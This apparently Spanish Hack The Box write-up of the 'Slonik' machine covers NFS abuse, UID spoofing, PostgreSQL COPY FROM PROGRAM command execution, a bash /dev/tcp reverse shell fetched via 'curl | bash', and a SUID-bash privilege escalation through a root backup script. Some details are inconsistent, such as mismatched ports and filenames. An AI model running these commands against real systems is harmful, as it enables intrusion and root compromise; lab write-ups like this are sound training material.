---
title: Slonik - Medium (HTB)
permalink: /Slonik-HTB-Writeup
tags:
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,111,2049,33881,41655,48165,49003,56411 10.129.234.160
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 20:45 -0300
Nmap scan report for 10.129.234.160
Host is up (0.91s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
2049/tcp  open  nfs      3-4 (RPC #100003)
33881/tcp open  status   1 (RPC #100024)
41655/tcp open  nlockmgr 1-4 (RPC #100021)
48165/tcp open  mountd   1-3 (RPC #100005)
49003/tcp open  mountd   1-3 (RPC #100005)
56411/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.36 seconds
```

## Shell as postgres
### NFS

Como el puerto `2049` esta abierto use `showmount` para ver los recursos compartidos por el protocolo `NFS`.

```bash
showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *
```

Son dos carpetas, por lo que dese mi maquina cree ambas dos y luego con `mount` realice las monturas a mi maquina.

```bash
mkdir -p /mnt/backup
mkdir -p /mnt/home
mount -t nfs 10.129.234.160:/var/backups /mnt/backup
mount -t nfs 10.129.234.160:/home /mnt/home
```
### Add user

En la carpeta `/var/backups` no hay demasiadas cosas, solo comprimidos `zip` pero con 0 informacion.

Luego en la ruta `/home` hay una carpeta `service` pero me sale acceso denegado al querer entrar.

```bash
/mnt/home# cd service 
cd: permission denied: service
```

Es porque viendo los permisos de la ruta solo el usuario con el `UID` 1337 tiene acceso, por lo que cree desde mi maquina a un usuario con dicho `uid`.

```bash
ls -la
total 12
drwxr-xr-x 3 root root 4096 Oct 24  2023 .
drwxr-xr-x 5 root root 4096 Jan 12 20:47 ..
drwxr-x--- 5 1337 1337 4096 Sep 22 09:46 service
```

Para agregarlo use `useradd`.

```bash
useradd -u 1337 htb_pwn
```
### Socks file

Y usando el propio usuario tengo acceso a la carpeta.

```bash
sudo -u htb_pwn ls -la /mnt/home/service
total 40
drwxr-x--- 5 htb_pwn htb_pwn 4096 Sep 22 09:46 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 htb_pwn htb_pwn   90 Sep 22 09:46 .bash_history
-rw-r--r-- 1 htb_pwn htb_pwn  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 htb_pwn htb_pwn 3771 Oct 24  2023 .bashrc
drwx------ 2 htb_pwn htb_pwn 4096 Oct 24  2023 .cache
drwxrwxr-x 3 htb_pwn htb_pwn 4096 Oct 24  2023 .local
-rw-r--r-- 1 htb_pwn htb_pwn  807 Oct 24  2023 .profile
-rw-r--r-- 1 htb_pwn htb_pwn  326 Sep 22 09:46 .psql_history
drwxrwxr-x 2 htb_pwn htb_pwn 4096 Oct 24  2023 .ssh

```

Veo un histórico de `psql`, con un hash y un usuario.

```bash
sudo -u htb_pwn cat /mnt/home/service/.psql_history
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
```
### Crack password

Fui a `CrackStation` para romper el hash, dándome la password `service`.

![image-center](/assets/images/Pasted image 20260112210239.png)
### SSH Fail

Usando estas credenciales para `ssh`  por algún motivo fallan.

```bash
ssh service@10.129.234.160                                                                       
The authenticity of host '10.129.234.160 (10.129.234.160)' can't be established.
ED25519 key fingerprint is: SHA256:j/hcANass/0veF/m0NAMOR41osL5zUMMMQ9nCYiwjmY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.160' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
(service@10.129.234.160) Password: 
<SNIP>

Connection to 10.129.234.160 closed.
```
### Socket file

Viendo además el histórico del sistema, veo que hay un archivo `socket` en la ruta `/var/run`.

```bash
 sudo -u htb_pwn cat  /mnt/home/service/.bash_history
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
```
### Port forwarding

Por lo que hice uso del mismo para traerme esa misma conexión a mi maquina.

```bash
ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
(service@10.129.234.160) Password:
```

Y con el mismo, puedo acceder a la base de datos.

```bash
psql -U postgres -h /tmp/    
psql (18.1 (Debian 18.1-2), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
Type "help" for help.

postgres=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
postgres=# \dt
Did not find any tables.
```
### Command execution

Como no tiene nada de contenido, cree una tabla en la cual tenga la capacidad de ejecutar comandos con `shell_exec`.

```sql
postgres=# CREATE TABLE shell_exec(output text);
CREATE TABLE
postgres=# COPY shell_exec FROM PROGRAM 'id';
COPY 1
postgres=# SELECT * FROM shell_exec;
                                 output                                 
------------------------------------------------------------------------
 uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
(1 row)
```

Visualizo la flag.
```bash
postgres=# COPY shell_exec FROM PROGRAM 'cat /var/lib/postgresql/user.txt';
COPY 1
postgres=# SELECT * FROM shell_exec;
              output              
----------------------------------
 2b5f3f93ef223555f4a5a8b29393fe9d
(1 row)
```
### Reverse shell

Luego como tuve ejecución de comandos, me cree una reverse shell.

```bash
cat shell.sh              
#!/bin/bash

bash -c "bash -c >& /dev/tcp/10.10.17.19/4444 0>&1"
```
## Shell as root

Y con `curl` hice una petición a mi archivo y lo pase por `bash` para que sea ejecutado.

```bash
curl http://10.10.17.19/shelll.sh | bash
```

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.234.160 - - [12/Jan/2026 22:31:46] "GET /shelll.sh HTTP/1.1" 200 -
```

Y desde mi listener `nc` recibo la conexión como el usuario `postgres`

```bash
 nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.160] 58800
bash: cannot set terminal process group (16984): Inappropriate ioctl for device
bash: no job control in this shell
postgres@slonik:/var/lib/postgresql/14/main$ whoami
whoami
postgres
```

### pspy

Como no vi nada en la maquina con `linpeas` subí `pspy` para monitorear procesos que se estén ejecutando en el sistema, y es asi como vi que el usuario `root` esta ejecutando `/usr/bin/backup`.

```bash
postgres@slonik:/var/lib/postgresql/14/main$ cd /tmp
postgres@slonik:/tmp$ wget http://10.10.17.19/pspy
--2026-01-13 01:36:40--  http://10.10.17.19/pspy
Connecting to 10.10.17.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy’

pspy                100%[===================>]   2.96M   374KB/s    in 13s     

2026-01-13 01:36:55 (229 KB/s) - ‘pspy’ saved [3104768/3104768]

postgres@slonik:/tmp$ chmod +x pspy 
postgres@slonik:/tmp$ ./pspy 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  

<SNIP>

-D /opt/backups/current/                                                                                                    
2026/01/13 01:38:02 CMD: UID=0     PID=17493  | /bin/bash /usr/bin/backup 
2026/01/13 01:38:03 CMD: UID=0     PID=17496  | /bin/bash /usr/bin/backup 
2026/01/13 01:38:03 CMD: UID=0     PID=17495  | 
2026/01/13 01:38:03 CMD: UID=0     PID=17494  | /bin/bash /usr/bin/backup
```

### Backup script abuse

Dentro del archivo, se puede ver que se hace uso de `pg_basebackup` donde la misma es una herramienta de backups para la base de datos, donde la misma realiza la conexcion al servidor de PostgreSQL.
Por defecto copia todo el directorio de base de datos, en este caso `/var/lib/postgres/14/main`, y deposita todo su contenido en el directorio `/opt/backups/current/`.

```bash
postgres@slonik:/tmp$ cat /usr/bin/backup
#!/bin/bash

date=$(/usr/bin/date +"%FT%H%M")
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/

count=$(/usr/bin/find "/var/backups/" -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)
if [ "$count" -gt 10 ]; then
  /usr/bin/rm -rf /var/backups/*
fi

```
### Copy bash

Para poder abusar de esto, sabiendo que la herramienta copia todo a otro directorio, puedo crear un archivo en el directorio de la base de datos, el cual le asigne el bit `SUID` a la bash, y luego asigarle los permisos adecuados.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Luego al mismo le doy permisos `SUID`, y además permisos de ejecución para otros usuarios, ya que cuando root mueva mi archivo a la otra carpeta los permisos cambian, haciendo que el script sea propiedad de `root`.

```bash
chmod 4755 privesc
```
### Shell

Luego de unos segundos, se puede ver como el archivo esta en la ruta, y además, el propietario es `root`.

```bash
postgres@slonik:/var/lib/postgresql/14/main$ ls -la /opt/backups/current/
total 1632
drwxr-xr-x 19 root root    4096 Jan 13 01:46 .
drwxr-xr-x  3 root root    4096 Oct 23  2023 ..
-rw-------  1 root root       3 Jan 13 01:46 PG_VERSION
-rw-------  1 root root     227 Jan 13 01:46 backup_label
-rw-------  1 root root  181579 Jan 13 01:46 backup_manifest
drwx------  6 root root    4096 Jan 13 01:46 base
drwx------  2 root root    4096 Jan 13 01:46 global
-rwsr-xr-x  1 root root 1396520 Jan 13 01:46 privesc
drwx------  2 root root    4096 Jan 13 01:46 pg_commit_ts
<SNIP>
```

Cuando es así y el script tiene el permiso `SUID`, el mismo se ejecuta con los permisos del propietario, por lo que puedo ejecutar el mismo con el parámetro `-p` para convertirme en `root`.

```bash
postgres@slonik:/var/lib/postgresql/14/main$ /opt/backups/current/privesc  -p
privesc-5.1# id
uid=115(postgres) gid=123(postgres) euid=0(root) groups=123(postgres),122(ssl-cert)
```

```bash
privesc-5.1# cat /root/root.txt 
2cb582cd567bfd996cdb742eb1d544de
```

`~Happy Hacking.`
